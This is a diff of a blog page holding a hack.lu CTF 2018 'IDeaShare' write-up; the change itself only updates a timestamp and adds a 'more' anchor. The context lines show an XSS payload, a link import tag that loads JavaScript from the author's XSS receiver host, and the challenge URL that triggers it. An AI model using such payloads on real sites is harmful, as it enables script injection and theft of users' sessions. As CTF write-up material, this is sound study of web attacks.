@@ -94,7 +94,7 @@
 <meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/httponly.png">
 <meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/admin.png">
 <meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/flag.png">
-<meta property="og:updated_time" content="2018-10-21T09:59:03.513Z">
+<meta property="og:updated_time" content="2018-10-22T14:50:50.656Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hacklu CTF 2018-IDeaShare-writeup(After the end of the CTF)">
 <meta name="twitter:description" content="First, there is a textarea for you to write your idea, some key words were blocked, but we can use link to import external resources, payload like this: 1&amp;lt;link/rel=import href=https://https.zer0b.c">
@@ -322,6 +322,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span>/<span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">https://https.zer0b.com/BlueLotus_XSSReceiver/myjs/tester.js</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>After save this as first idea, we can access url below to bring the js  into effect:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://arcade.fluxfingers.net:1818/?page=view&amp;raw&amp;owner=304&amp;pad=1</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>There are some restrictions when we use the <code>link</code> tag:</p>
 <ul>
 <li><p>the href attribute must start with <code>https</code>, when use <code>http</code> will look like this:</p>
